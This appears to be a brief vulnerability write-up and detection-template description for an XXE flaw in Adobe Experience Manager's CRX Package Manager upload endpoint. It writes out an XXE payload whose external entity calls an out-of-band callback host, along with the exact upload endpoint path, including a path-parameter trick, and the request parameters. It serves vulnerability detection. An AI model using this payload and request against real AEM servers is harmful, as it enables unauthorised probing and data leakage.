## Vulnerability
Adobe Experience Manager versions 6.5.23.0 and earlier are affected by an XML Injection (CWE-91, XXE) vulnerability in the CRX Package Manager upload endpoint. Malicious XML payloads can bypass security features by enabling external entity processing, allowing potential access to sensitive information through OOB references. CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N).

## PoC / Detection
Classification: info-leak

The template dynamically builds a ZIP containing `META-INF/vault/privileges.xml` embedding the XXE payload `<!DOCTYPE x [<!ENTITY foo SYSTEM "http://{{interactsh-url}}/{{marker}}">]><x>&foo;</x>`, then issues a multipart/form-data POST to `/crx/packmgr/service/exec.json;x='x/graphql/execute/json/x'?cmd=upload&jsonInTextarea=true` and confirms via HTTP 200 + "success" in body plus OOB HTTP callback on interactsh.
